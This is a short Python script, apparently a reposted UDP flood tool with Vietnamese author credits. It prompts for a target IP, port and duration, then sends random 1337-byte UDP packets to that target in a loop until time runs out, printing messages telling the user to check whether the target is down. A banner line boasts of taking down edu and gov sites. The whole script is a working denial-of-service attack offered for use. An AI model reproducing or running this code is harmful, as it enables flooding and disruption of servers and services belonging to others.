import sys
import os
import time
import socket
import random
from termcolor import colored
#This is where the magic starts using the power of python
from datetime import datetime
from colorama import Fore


now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1337)
#############
#Install Figlet
os.system("clear")
os.system("apt-get install -y figlet")
os.system("figlet REUP SC BY LINHCUTO")
print()
print(colored("CRE CODE   : SaintDruG", 'green'))
print(colored("SOCK BY : LBP", 'magenta'))
print(colored("Github   : https://github.com/linhdzzzzzzzzzzzzzzzzzzzzz", 'red'))
print(colored("Facebook : https://www.facebook.com/tgtgn/", 'green'))
print(colored("NAME REUP PHAM BAO LINH", 'green'))
print(colored("TELE : @linhbp", 'magenta'))
print(colored("Instagram : ĐÉO Có :)))", 'yellow'))
print(colored("ZALO : 113", 'green'))
print(colored("Haha Tool Lỏ Có Cái Đb Die Edu Với Gov:)))", 'magenta'))
print(colored("gút.", 'cyan'))
print(colored("HELLO", 'red'))
print()
ip = input("IP Target : ")
port = eval(input("Port       : "))
dur = input("Time: ")
timeout = time.time() + int(dur)
sent = 0
os.system("clear")
os.system("figlet Attack Starting")

par = "■"

for i in range(0,100):
    print(Fore.RED+par,end="")
    time.sleep(0.08)
while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(colored("Packets are being sent like crazy, check if the target is down... we sent %s packets to this Target: %s" % (
            sent, ip), 'green'))
    except KeyboardInterrupt:
        sys.exit()
